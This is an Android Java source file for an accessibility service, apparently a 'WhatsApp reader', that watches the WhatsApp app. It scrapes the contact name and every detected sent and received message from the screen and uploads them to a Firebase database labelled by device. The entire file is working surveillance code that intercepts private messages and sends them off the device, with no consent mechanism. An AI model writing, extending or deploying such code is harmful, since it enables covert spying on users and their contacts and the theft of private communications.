package com.witcher.whatreader;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.UUID;


public class WhatAccessService extends AccessibilityService {


    private static final String TAG = "this is TAG";


    private Boolean ChatScreen = false ;

    private String msgName;
    private String msgRecieved;
    private String msgSent;

    FirebaseDatabase database = FirebaseDatabase.getInstance();

    // Getting Device Name

    public static String getDeviceName() {
        return Build.MODEL;
    }

    // Getting Device Unique UUID

    String uniqueID = UUID.randomUUID().toString();

    // The Device Identifier

    String identifier = getDeviceName()+"-("+uniqueID+")";


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

       try {


           AccessibilityNodeInfo currentNode = getRootInActiveWindow();


           if (currentNode.getChild(1) != null) {

               if (currentNode.getChild(1).getChild(0) != null && currentNode.getChild(1).getChild(0).getClassName() != null && currentNode.getChild(1).getChild(0).getClassName().equals("android.widget.TextView") && !currentNode.getChild(1).getChild(0).getText().toString().isEmpty()) {

                   if (msgName == null) {

                       msgName =  currentNode.getChild(1).getChild(0).getText().toString();

                       Log.d(TAG, "Name of Chat is ==> "+msgName);


                       ChatScreen = true;


                   } else {


                       msgName =  currentNode.getChild(1).getChild(0).getText().toString();

                       Log.d(TAG, "Name of Chat is ==> "+msgName);

                       ChatScreen = true;


                   }
               } else {

                   ChatScreen = false;
               }
           }

           // Getting the Recieved Chat

           if (ChatScreen) {


               if ( event.getContentChangeTypes() ==  AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT && event.getClassName().toString().equals("android.widget.TextView") ) {


                   // Filtering Repeated data


                   if (currentNode.getChild(5).getChildCount() > 0  ) {

                       int lastChild = currentNode.getChild(5).getChildCount() - 1;

                       if (currentNode.getChild(5).getChild(lastChild).getChildCount() > 1  ) {

                           int lastmsgRecieved = currentNode.getChild(5).getChild(lastChild).getChildCount() - 2;


                           if (currentNode.getChild(5).getChild(lastChild).getChild(lastmsgRecieved).getText() != null  && !currentNode.getChild(5).getChild(lastChild).getChild(lastmsgRecieved).getText().toString().endsWith(" AM") && !currentNode.getChild(5).getChild(lastChild).getChild(lastmsgRecieved).getText().toString().endsWith(" PM")) {

                               // Filtering Repeated data

                               if (msgRecieved == null ) {

                                   msgRecieved = currentNode.getChild(5).getChild(lastChild).getChild(lastmsgRecieved).getText().toString();

                                   Log.d(TAG, "The Name of Client ==>  " + msgName);
                                   Log.d(TAG, "The Msg recieved ==>  " + msgRecieved);


                                   HashMap<String, String> chat_map = new HashMap<>();

                                   chat_map.put( "msg", msgRecieved);
                                   chat_map.put("type", "Recieved");
                                   DatabaseReference myRef2 = database.getReference(identifier+"/"+msgName);
                                   myRef2.push().setValue(chat_map);



                               } else {

                                   if ( !msgRecieved.matches(currentNode.getChild(5).getChild(lastChild).getChild(lastmsgRecieved).getText().toString())) {

                                       msgRecieved = currentNode.getChild(5).getChild(lastChild).getChild(lastmsgRecieved).getText().toString();

                                       Log.d(TAG, "The Name of Client ==>  " + msgName);
                                       Log.d(TAG, "The Msg recieved ==>  " + msgRecieved);


                                       HashMap<String, String> chat_map = new HashMap<>();

                                       chat_map.put( "msg", msgRecieved);
                                       chat_map.put("type", "Recieved");
                                       DatabaseReference myRef2 = database.getReference(identifier+"/"+msgName);
                                       myRef2.push().setValue(chat_map);



                                   }

                               }

                           }

                       }

                   }

               }

               // Getting the Sent Chat

               if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&  event.getContentChangeTypes() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT && event.getClassName().toString().equals("android.widget.TextView")  ) {

                   // Filtering Repeated data

                   if (currentNode.getChild(5).getChildCount() > 0  ) {

                       int lastChild = currentNode.getChild(5).getChildCount() - 1;

                       if (currentNode.getChild(5).getChild(lastChild).getChildCount() > 2  ) {

                           int lastmsgSent = currentNode.getChild(5).getChild(lastChild).getChildCount() - 3;

                           if (currentNode.getChild(5).getChild(lastChild).getChild(lastmsgSent).getText() != null  ) {


                               // Filtering Repeated data

                               if (msgSent == null) {

                                   msgSent = currentNode.getChild(5).getChild(lastChild).getChild(lastmsgSent).getText().toString();

                                   Log.d(TAG, "The Name of Client ==>  " + msgName);
                                   Log.d(TAG, "The Msg Sent ==>  " + msgSent);


                                       HashMap<String, String> chat_map = new HashMap<>();

                                       chat_map.put( "msg", msgSent);
                                       chat_map.put("type", "Sent");
                                       DatabaseReference myRef2 = database.getReference(identifier+"/" +msgName);
                                       myRef2.push().setValue(chat_map);



                               } else {



                                   if (!msgSent.matches(currentNode.getChild(5).getChild(lastChild).getChild(lastmsgSent).getText().toString())) {

                                       msgSent = currentNode.getChild(5).getChild(lastChild).getChild(lastmsgSent).getText().toString();

                                       Log.d(TAG, "The Name of Client ==>  " + msgName);
                                       Log.d(TAG, "The Msg Sent ==>  " + msgSent);


                                           HashMap<String, String> chat_map = new HashMap<>();

                                           chat_map.put( "msg", msgSent);
                                           chat_map.put("type", "Sent");
                                           DatabaseReference myRef2 = database.getReference(identifier+"/" +msgName);
                                           myRef2.push().setValue(chat_map);



                                   }

                               }

                           }

                       }

                   }

               }

//               Log.d(TAG, "event  ==  "+ event);

           }

       } catch (Exception e) {
           e.printStackTrace();
       }

    }


    @Override
    public void onInterrupt() {

    }


    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        Log.d("access", "service connected");
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ;
        info.packageNames = new String[] {"com.whatsapp"};
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS; info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.flags = AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY; info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 0;
        this.setServiceInfo(info);
    }
}

